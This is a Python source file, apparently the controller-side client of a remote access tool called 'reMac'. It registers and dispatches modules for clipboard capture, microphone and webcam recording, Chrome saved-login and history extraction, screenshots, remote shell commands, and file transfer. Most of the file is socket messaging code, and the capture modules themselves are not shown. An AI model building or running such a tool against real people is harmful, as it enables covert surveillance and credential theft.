import json
import os
import base64
from apps.libs.reMac_libbase import reMac_libbase
from apps.client.modules.mod_client_clipboard import mod_client_clipboard
from apps.client.modules.mod_client_hello import mod_client_hello
from apps.client.modules.mod_client_recmic import mod_client_recmic
from apps.client.modules.mod_client_info import mod_client_info
from apps.client.modules.mod_client_chrome_login import mod_client_chrome_login
from apps.client.modules.mod_client_chrome_history import mod_client_chrome_history
from apps.client.modules.mod_client_module_help import mod_client_module_help
from apps.client.modules.mod_client_screenshot import mod_client_screenshot
from apps.client.modules.mod_client_webcam import mod_client_webcam
from apps.client.modules.mod_client_shellcmd import mod_client_shellcmd
from apps.client.modules.mod_client_download import mod_client_download
from apps.client.modules.mod_client_upload import mod_client_upload
from apps.client.modules.mod_client_help import mod_client_help


class reMac_libclient(reMac_libbase):

    reMacModules = {
        'hw': [mod_client_hello(), 'helloworld', 'Call HelloWorld module', 'hw'],
        'cb': [mod_client_clipboard(), 'clipboard', 'Call clipboard module', 'cb'],
        'rm': [mod_client_recmic(), 'record microphone', 'Call record microphone module', 'rm'],
        'mh': [mod_client_module_help(), 'Module help', 'Call module help module', 'mh'],
        'in': [mod_client_info(), 'Module info', 'Call info module', 'in'],
        'cl': [mod_client_chrome_login(), 'Module Chrome login', 'Call chrome login module', 'cl'],
        'ch': [mod_client_chrome_history(), 'Module Chrome history', 'Call chrome history module', 'ch'],
        'sc': [mod_client_screenshot(), 'Module Screenshot', 'Call screenshot module', 'sc'],
        'wc': [mod_client_webcam(), 'Module Webcam', 'Call webcam module', 'wc'],
        'sh': [mod_client_shellcmd(), 'Module shell command', 'Call shell command module', 'sh'],
        'dl': [mod_client_download(), 'Module download', 'Call download module', 'dl'],
        'ul': [mod_client_upload(), 'Module upload', 'Call upload module', 'ul'],
        'hp': [mod_client_help(), 'Module help', 'Call help module', 'hp']
    }

    prg = None

    def __init__(self, selector, sock, addr, request, prg = None):
        reMac_libbase.__init__(self, selector, sock, addr)
        self.prg = prg
        self.request = request
        self._recv_buffer = b""
        self._send_buffer = b""
        self._request_queued = False
        self._jsonheader_len = None
        self.jsonheader = None
        self.response = None

    def try_process_respons(self, action, message):
        return self.reMacModules[action][0].run_mod(message)

    def _read(self):
        try:
            # Should be ready to read
            data = self.sock.recv(4096)
        except BlockingIOError:
            # Resource temporarily unavailable (errno EWOULDBLOCK)
            pass
        else:
            if data:
                self._recv_buffer += data
            else:
                raise RuntimeError("Peer closed.")

    def _write(self):
        if self._send_buffer:
            print("sending", repr(self._send_buffer), "to", self.addr)
            try:
                # Should be ready to write
                sent = self.sock.send(self._send_buffer)
            except BlockingIOError:
                # Resource temporarily unavailable (errno EWOULDBLOCK)
                pass
            else:
                self._send_buffer = self._send_buffer[sent:]

    def _process_response_json_content(self):
        content = self.response
        result = content.get("result")
        action = content.get("action")
        try:
            result = json.loads(result)
        except Exception:
            pass
        result = json.dumps(result, indent=4, sort_keys=True)
        if action.startswith("mh")\
                or action == "in":
            return self.reMacModules[action.split(" ")[0]][0].run_mod(content)
        elif action.startswith("cb"):
            return self.reMacModules["cb"][0].run_mod(content)
        elif action.startswith("sc"):
            return self.reMacModules["sc"][0].run_mod(content)
        elif action.startswith("wc"):
            return self.reMacModules["wc"][0].run_mod(content)
        elif action.startswith("rm"):
            return self.reMacModules["rm"][0].run_mod(content)
        elif action.startswith("cl"):
            return self.reMacModules["cl"][0].run_mod(content)
        elif action.startswith("ch"):
            return self.reMacModules["ch"][0].run_mod(content)
        elif action.startswith("hw"):
            return self.reMacModules["hw"][0].run_mod(content)
        elif action.startswith("sh"):
            return self.reMacModules["sh"][0].run_mod(content)
        elif action.startswith("dl"):
            return self.reMacModules["dl"][0].run_mod(content)
        elif action.startswith("ul"):
            return self.reMacModules["ul"][0].run_mod(content)
        elif action.startswith("hp"):
            return self.reMacModules["hp"][0].run_mod(content)
        else:
            print(f"got result: {result}, action: {action}")

    def _process_response_binary_content(self):
        content = self.response
        print(f"got response: {repr(content)}")

    def read(self):
        self._read()

        if self._jsonheader_len is None:
            self.process_protoheader()

        if self._jsonheader_len is not None:
            if self.jsonheader is None:
                self.process_jsonheader()

        if self.jsonheader:
            if self.response is None:
                self.process_response()

    def write(self):
        if not self._request_queued:
            self.queue_request()

        self._write()

        if self._request_queued:
            if not self._send_buffer:
                # Set selector to listen for read events, we're done writing.
                self._set_selector_events_mask("r")

    def queue_request(self):
        content = self.request["content"]
        content_type = self.request["type"]
        content_encoding = self.request["encoding"]
        if content_type == "text/json":
            req = {
                "content_bytes": self._json_encode(content, content_encoding),
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        else:
            req = {
                "content_bytes": content,
                "content_type": content_type,
                "content_encoding": content_encoding,
            }
        message = self._create_message(**req)
        self._send_buffer += message
        self._request_queued = True

    def process_response(self):
        content_len = self.jsonheader["content-length"]
        if not len(self._recv_buffer) >= content_len:
            return
        data = self._recv_buffer[:content_len]
        self._recv_buffer = self._recv_buffer[content_len:]
        if self.jsonheader["content-type"] == "text/json":
            encoding = self.jsonheader["content-encoding"]
            self.response = self._json_decode(data, encoding)
            print("received response", repr(self.response), "from", self.addr)
            self.prg.emit(self._process_response_json_content())
        else:
            # Binary or unknown content-type
            self.response = data
            print(
                f'received {self.jsonheader["content-type"]} response from',
                self.addr,
            )
            self._process_response_binary_content()
        # Close when response has been processed
        self.close()
